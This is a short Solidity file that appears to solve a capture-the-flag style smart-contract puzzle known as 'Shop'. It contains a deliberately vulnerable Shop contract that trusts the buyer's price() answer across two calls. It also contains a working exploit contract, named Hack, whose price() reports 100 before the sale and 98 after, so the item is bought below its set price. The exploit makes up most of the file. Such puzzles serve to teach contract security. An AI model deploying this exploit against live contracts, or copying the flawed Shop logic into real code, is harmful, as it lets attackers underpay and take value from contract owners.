// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
        uint256 public price = 100;
        bool public isSold;

        function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
        }
        }
}
contract Hack{
        Shop public immutable target;
        constructor(address _target){
                target = Shop(_target);
        }
       
        function price() external view returns (uint256){
               if(!target.isSold()){
                return 100;
               }
               return 98;
        }
        function add() external {
            target.buy();
            require(target.price() <100,"price >100");
        }
}